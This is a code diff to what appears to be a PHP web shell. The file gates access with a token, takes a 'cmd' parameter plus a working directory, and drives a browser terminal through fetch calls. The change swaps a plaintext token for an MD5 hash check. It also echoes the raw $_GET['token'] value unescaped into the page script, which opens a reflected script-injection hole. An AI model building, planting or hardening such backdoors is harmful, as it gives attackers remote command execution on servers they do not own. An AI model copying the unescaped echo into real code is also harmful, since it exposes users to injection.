@@ -1,8 +1,9 @@
 <?php
 
-const TOKEN = 'apodjaofapejefopaef';
+const TOKEN = 'f20802a1753539b899b83b0438299447';
 
-if (!array_key_exists(TOKEN, $_GET)) die("nope");
+if (!isset($_GET["token"])) die("no token provided");
+if(md5($_GET['token']) != TOKEN) die("wrong token provided");
 
 if(array_key_exists("cmd", $_GET)){
     $cmd = $_GET['cmd'];
@@ -168,7 +169,7 @@ if(array_key_exists("cmd", $_GET)){
     }
 
     async function get(cmd) {
-        return await fetch(`?<?= TOKEN ?>=1&cmd=${cmd}&cwd=${cwd}`).then(res => res.text())
+        return await fetch(`?token=<?= $_GET['token'] ?>&cmd=${cmd}&cwd=${cwd}`).then(res => res.text())
     }
 
     init()
